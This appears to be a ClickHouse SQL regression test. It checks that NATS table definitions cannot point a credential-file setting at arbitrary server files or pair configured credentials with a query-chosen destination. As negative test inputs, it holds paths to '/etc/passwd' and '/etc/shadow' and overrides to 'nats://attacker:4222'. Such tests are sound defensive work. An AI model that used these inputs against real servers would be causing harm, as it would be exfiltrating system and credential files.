-- Tags: no-fasttest, no-parallel, no-replicated-database
-- Tag justification:
--   no-fasttest: the NATS engine is not available in a build without libraries.
--   no-parallel: creates and drops global named collections; the flaky check runs the same test
--                concurrently, and parallel repetitions collide on them (the first finishing run
--                drops the collection while others still use it).
--   no-replicated-database: named collections are server-global, not database-scoped.

-- `nats_credential_file` is a path on the server filesystem: the server opens it with its own
-- privileges, and during authentication the credentials are sent to `nats_url`, which comes from
-- the same query. A path taken from SQL would let anyone who can define a `NATS` source probe the
-- local filesystem and exfiltrate files the server can read to a NATS server they control. So the
-- path is accepted only from a named collection defined in the server configuration file, with a
-- destination that is not overridden by SQL; every SQL path spelling is rejected, and
-- the inline `nats_credentials` setting is the SQL way to provide the same credentials.
-- The tables never connect to a NATS server: `127.0.0.1:1` (used by the `nats_config_credentials`
-- collection from the test server configuration as well) refuses the connection immediately,
-- so passing the validation surfaces as `CANNOT_CONNECT_NATS`.

-- The path in the `SETTINGS` clause of the query.
CREATE TABLE nats_file_in_settings (key UInt64) ENGINE = NATS
SETTINGS nats_url = '127.0.0.1:1', nats_subjects = 'subject', nats_format = 'JSONEachRow',
    nats_startup_connect_tries = 1, nats_reconnect_wait = 1,
    nats_credential_file = '/etc/passwd'; -- { serverError BAD_ARGUMENTS }

-- The path stored in a named collection created by SQL: `CREATE NAMED COLLECTION` does not require
-- the privileges needed to read arbitrary server files, so this source is not trusted either.
DROP NAMED COLLECTION IF EXISTS 04891_nats_sql_collection;
CREATE NAMED COLLECTION 04891_nats_sql_collection AS
    nats_url = '127.0.0.1:1', nats_subjects = 'subject', nats_format = 'JSONEachRow',
    nats_startup_connect_tries = 1, nats_reconnect_wait = 1, nats_credential_file = '/etc/passwd';

CREATE TABLE nats_file_in_sql_collection (key UInt64) ENGINE = NATS(04891_nats_sql_collection); -- { serverError BAD_ARGUMENTS }

-- The path as an engine-argument override on top of a named collection.
CREATE TABLE nats_file_in_override (key UInt64)
ENGINE = NATS(04891_nats_sql_collection, nats_credential_file = '/etc/shadow'); -- { serverError BAD_ARGUMENTS }

-- Replacing the path stored in the SQL collection with inline credentials from the query is fine:
-- the path itself is never used then.
CREATE TABLE nats_credentials_over_sql_file (key UInt64)
ENGINE = NATS(04891_nats_sql_collection, nats_credentials = 'user JWT and seed'); -- { serverError CANNOT_CONNECT_NATS }

DROP NAMED COLLECTION 04891_nats_sql_collection;

-- A named collection defined in the server configuration file is operator-controlled,
-- so a path stored there is accepted: the validation passes and the connection attempt fails.
CREATE TABLE nats_file_in_config_collection (key UInt64) ENGINE = NATS(nats_config_credentials); -- { serverError CANNOT_CONNECT_NATS }

-- The trusted credential file must stay paired with the trusted destination. Both query spellings
-- for overriding the destination are rejected before the server attempts to connect.
CREATE TABLE nats_file_with_url_override (key UInt64)
ENGINE = NATS(nats_config_credentials, nats_url = 'nats://attacker:4222'); -- { serverError BAD_ARGUMENTS }

CREATE TABLE nats_file_with_server_list_override (key UInt64) ENGINE = NATS(nats_config_credentials)
SETTINGS nats_server_list = 'nats://attacker:4222'; -- { serverError BAD_ARGUMENTS }

-- Inline credentials replace the configured file before connecting, so their destination may be
-- selected in SQL: the file is not opened and cannot be sent to that endpoint.
CREATE TABLE nats_credentials_with_url_override (key UInt64)
ENGINE = NATS(nats_config_credentials, nats_credentials = 'user JWT and seed', nats_url = '127.0.0.1:1'); -- { serverError CANNOT_CONNECT_NATS }

-- A full-definition `ATTACH` is fresh user input and is validated like `CREATE`, rather than an
-- existing-metadata replay. Therefore its destination override is rejected.
ATTACH TABLE nats_file_with_url_override_from_existing_metadata UUID 'c6d2423a-9ab2-4a37-8e56-10e479541001' (key UInt64)
ENGINE = NATS(nats_config_credentials, nats_url = 'nats://attacker:4222'); -- { serverError BAD_ARGUMENTS }
DROP TABLE IF EXISTS nats_file_with_url_override_from_existing_metadata;

-- SQL named collections stay mutable after a table is created. Create a table while its collection
-- is valid, then replay its stored metadata with a short `ATTACH` after adding a credential-file
-- path. This must validate the collection's current path during metadata reload; otherwise changing
-- the collection after an upgrade would bypass this restriction.
CREATE NAMED COLLECTION 04891_nats_existing_sql_collection AS
    nats_url = '127.0.0.1:1', nats_subjects = 'subject', nats_format = 'JSONEachRow',
    nats_startup_connect_tries = 0, nats_reconnect_wait = 1;
-- A full-definition `ATTACH` is validated exactly like `CREATE`, and unlike `CREATE` it tolerates
-- a failing connection attempt, so the table exists afterwards and its metadata can be replayed.
-- The `SETTINGS` clause carries an unrelated key on purpose: an engine definition whose settings
-- are all inherited from the named collection is stored with an empty `SETTINGS` clause, which the
-- metadata reload then fails to parse.
ATTACH TABLE nats_file_from_existing_sql_collection UUID 'c6d2423a-9ab2-4a37-8e56-10e479541002' (key UInt64)
ENGINE = NATS(04891_nats_existing_sql_collection)
SETTINGS nats_num_consumers = 1;
DETACH TABLE nats_file_from_existing_sql_collection;
ALTER NAMED COLLECTION 04891_nats_existing_sql_collection SET nats_credential_file = '/etc/passwd';
ATTACH TABLE nats_file_from_existing_sql_collection; -- { serverError BAD_ARGUMENTS }
ALTER NAMED COLLECTION 04891_nats_existing_sql_collection DELETE nats_credential_file;
ATTACH TABLE nats_file_from_existing_sql_collection;
DROP TABLE nats_file_from_existing_sql_collection;
DROP NAMED COLLECTION 04891_nats_existing_sql_collection;

-- Basic authentication configured in a named collection has the same
-- destination-binding rule as a `.creds` file.
CREATE TABLE nats_basic_credentials_in_config_collection (key UInt64)
ENGINE = NATS(nats_config_basic_credentials); -- { serverError CANNOT_CONNECT_NATS }

-- Global `<nats>` credentials remain a fallback for tables which define their destination in SQL.
CREATE TABLE nats_global_basic_credentials (key UInt64) ENGINE = NATS
SETTINGS nats_url = '127.0.0.1:1', nats_subjects = 'subject', nats_format = 'JSONEachRow',
    nats_startup_connect_tries = 1, nats_reconnect_wait = 1; -- { serverError CANNOT_CONNECT_NATS }

-- A table-level authentication method suppresses all global fallback methods. Otherwise the
-- global user/password and this token would both be serialized in the `CONNECT` frame.
CREATE TABLE nats_token_over_global_basic_credentials (key UInt64) ENGINE = NATS
SETTINGS nats_url = '127.0.0.1:1', nats_subjects = 'subject', nats_format = 'JSONEachRow',
    nats_startup_connect_tries = 1, nats_reconnect_wait = 1,
    nats_token = 'token'; -- { serverError CANNOT_CONNECT_NATS }

CREATE TABLE nats_basic_credentials_with_url_override (key UInt64)
ENGINE = NATS(nats_config_basic_credentials, nats_url = 'nats://attacker:4222'); -- { serverError BAD_ARGUMENTS }

-- Clearing the authentication a configuration-defined collection carries does not resurrect the
-- server-global `<nats>` fallback. The table definition decided its authentication - the decision
-- being to have none - so the global account is not sent to the destination the query selected.
-- Otherwise clearing the collection's keys would be a way to pair the global credentials with an
-- arbitrary endpoint: it drops `trusted_credentials_from_collection`, so the destination override
-- below is accepted.
CREATE TABLE nats_cleared_basic_credentials_with_url_override (key UInt64)
ENGINE = NATS(nats_config_basic_credentials, nats_username = '', nats_password = '',
    nats_url = '127.0.0.1:1'); -- { serverError CANNOT_CONNECT_NATS }

CREATE TABLE nats_cleared_basic_credentials_in_settings_with_url_override (key UInt64)
ENGINE = NATS(nats_config_basic_credentials)
SETTINGS nats_username = '', nats_password = '', nats_url = '127.0.0.1:1'; -- { serverError CANNOT_CONNECT_NATS }

CREATE TABLE nats_basic_credentials_with_server_list_override (key UInt64)
ENGINE = NATS(nats_config_basic_credentials)
SETTINGS nats_server_list = 'nats://attacker:4222'; -- { serverError BAD_ARGUMENTS }

-- The `SETTINGS` clause must follow the ordinary named-collection override policy for basic
-- credentials as well. In particular, replacement and empty-string clearing cannot bypass keys
-- the operator marked `overridable="false"`.
CREATE TABLE nats_locked_basic_password_in_settings (key UInt64)
ENGINE = NATS(nats_config_locked_basic_credentials)
SETTINGS nats_password = 'other'; -- { serverError BAD_ARGUMENTS }

CREATE TABLE nats_locked_basic_password_cleared_in_settings (key UInt64)
ENGINE = NATS(nats_config_locked_basic_credentials)
SETTINGS nats_password = ''; -- { serverError BAD_ARGUMENTS }

-- User/password authentication and token authentication are separate methods. They cannot be
-- combined in direct settings or in a named collection.
CREATE TABLE nats_user_password_and_token (key UInt64) ENGINE = NATS
SETTINGS nats_url = '127.0.0.1:1', nats_subjects = 'subject', nats_format = 'JSONEachRow',
    nats_username = 'user', nats_password = 'password', nats_token = 'token'; -- { serverError BAD_ARGUMENTS }

DROP NAMED COLLECTION IF EXISTS 04891_nats_mixed_basic_auth;
CREATE NAMED COLLECTION 04891_nats_mixed_basic_auth AS
    nats_url = '127.0.0.1:1', nats_subjects = 'subject', nats_format = 'JSONEachRow',
    nats_username = 'user', nats_password = 'password', nats_token = 'token';
CREATE TABLE nats_mixed_basic_auth_in_collection (key UInt64)
ENGINE = NATS(04891_nats_mixed_basic_auth); -- { serverError BAD_ARGUMENTS }
DROP NAMED COLLECTION 04891_nats_mixed_basic_auth;

-- Authentication methods cannot be layered: a query cannot add inline credentials to a collection
-- that defines basic credentials, or add basic credentials to one that defines a credentials file.
CREATE TABLE nats_inline_credentials_over_locked_basic_credentials (key UInt64)
ENGINE = NATS(nats_config_locked_basic_credentials, nats_credentials = 'user JWT and seed'); -- { serverError BAD_ARGUMENTS }

CREATE TABLE nats_basic_credentials_over_locked_file (key UInt64)
ENGINE = NATS(nats_config_locked_credentials, nats_username = 'user', nats_password = 'password'); -- { serverError BAD_ARGUMENTS }

-- But an override of the path on top of the configuration-defined collection comes from SQL again.
CREATE TABLE nats_file_over_config_collection (key UInt64)
ENGINE = NATS(nats_config_credentials, nats_credential_file = '/etc/shadow'); -- { serverError BAD_ARGUMENTS }

-- The `SETTINGS` clause spelling of the same override is query-level as well.
CREATE TABLE nats_file_in_settings_over_config_collection (key UInt64) ENGINE = NATS(nats_config_credentials)
SETTINGS nats_credential_file = '/etc/shadow'; -- { serverError BAD_ARGUMENTS }

-- Replacing the configured path with inline credentials from the query is fine.
CREATE TABLE nats_credentials_over_config_file (key UInt64)
ENGINE = NATS(nats_config_credentials, nats_credentials = 'user JWT and seed'); -- { serverError CANNOT_CONNECT_NATS }

CREATE TABLE nats_credentials_in_settings_over_config_file (key UInt64) ENGINE = NATS(nats_config_credentials)
SETTINGS nats_credentials = 'user JWT and seed'; -- { serverError CANNOT_CONNECT_NATS }

-- Overriding the path with the empty string is not a way around the rejection: it carries no path of
-- its own, but it would silently drop the credentials the operator configured.
CREATE TABLE nats_empty_file_over_config_collection (key UInt64)
ENGINE = NATS(nats_config_credentials, nats_credential_file = ''); -- { serverError BAD_ARGUMENTS }

CREATE TABLE nats_empty_file_in_settings_over_config_collection (key UInt64) ENGINE = NATS(nats_config_credentials)
SETTINGS nats_credential_file = ''; -- { serverError BAD_ARGUMENTS }

-- The same through the contents form: an empty `nats_credentials` never replaces the configured
-- credentials with other ones, it can only drop them.
CREATE TABLE nats_empty_credentials_over_config_collection (key UInt64)
ENGINE = NATS(nats_config_credentials, nats_credentials = ''); -- { serverError BAD_ARGUMENTS }

CREATE TABLE nats_empty_credentials_in_settings_over_config_collection (key UInt64) ENGINE = NATS(nats_config_credentials)
SETTINGS nats_credentials = ''; -- { serverError BAD_ARGUMENTS }

-- Macro expansion happens before validation. An empty macro therefore cannot silently drop a
-- credentials file from a configuration-defined collection.
CREATE TABLE nats_empty_macro_credentials_over_config_collection (key UInt64)
ENGINE = NATS(nats_config_credentials, nats_credentials = '{empty}'); -- { serverError BAD_ARGUMENTS }

-- When the collection carries no credentials at all there is nothing to drop, so an empty assignment
-- stays the no-op it is for a table which uses no named collection.
CREATE TABLE nats_empty_credentials_over_config_collection_without_credentials (key UInt64)
ENGINE = NATS(nats_config_no_credentials, nats_credentials = ''); -- { serverError CANNOT_CONNECT_NATS }

CREATE TABLE nats_empty_credentials_in_settings_without_credentials (key UInt64) ENGINE = NATS(nats_config_no_credentials)
SETTINGS nats_credentials = ''; -- { serverError CANNOT_CONNECT_NATS }

-- Credentials the operator locked with `overridable="false"` cannot be replaced through the contents
-- form either - in neither spelling. The `nats_config_credentials` cases above, which differ only in
-- the collection not being locked, reach the connection attempt, so the lock is what rejects these.
CREATE TABLE nats_credentials_over_locked_config_file (key UInt64)
ENGINE = NATS(nats_config_locked_credentials, nats_credentials = 'user JWT and seed'); -- { serverError BAD_ARGUMENTS }

CREATE TABLE nats_credentials_in_settings_over_locked_config_file (key UInt64) ENGINE = NATS(nats_config_locked_credentials)
SETTINGS nats_credentials = 'user JWT and seed'; -- { serverError BAD_ARGUMENTS }

-- The locked path is still usable as it is stored in the collection.
CREATE TABLE nats_locked_config_file (key UInt64) ENGINE = NATS(nats_config_locked_credentials); -- { serverError CANNOT_CONNECT_NATS }

-- Passing the contents is the only way to supply these credentials from SQL, so it is not treated as
-- a brand-new key: it stays usable when overrides are forbidden by default, where the operator states
-- the permission with `overridable="false"` instead. An unrelated key is still a new key there.
SET allow_named_collection_override_by_default = 0;

CREATE TABLE nats_credentials_over_config_file_no_override_by_default (key UInt64)
ENGINE = NATS(nats_config_credentials, nats_credentials = 'user JWT and seed'); -- { serverError CANNOT_CONNECT_NATS }

CREATE TABLE nats_credentials_over_locked_config_file_no_override_by_default (key UInt64)
ENGINE = NATS(nats_config_locked_credentials, nats_credentials = 'user JWT and seed'); -- { serverError BAD_ARGUMENTS }

-- The `SETTINGS` spelling follows the same new-key policy as the engine-argument spelling,
-- even though this collection has neither credential key.
CREATE TABLE nats_credentials_in_settings_over_config_collection_without_credentials_no_override_by_default (key UInt64)
ENGINE = NATS(nats_config_no_credentials)
SETTINGS nats_credentials = 'user JWT and seed'; -- { serverError BAD_ARGUMENTS }

CREATE TABLE nats_subjects_over_config_collection_no_override_by_default (key UInt64)
ENGINE = NATS(nats_config_credentials, nats_subjects = 'other'); -- { serverError BAD_ARGUMENTS }

SET allow_named_collection_override_by_default = 1;
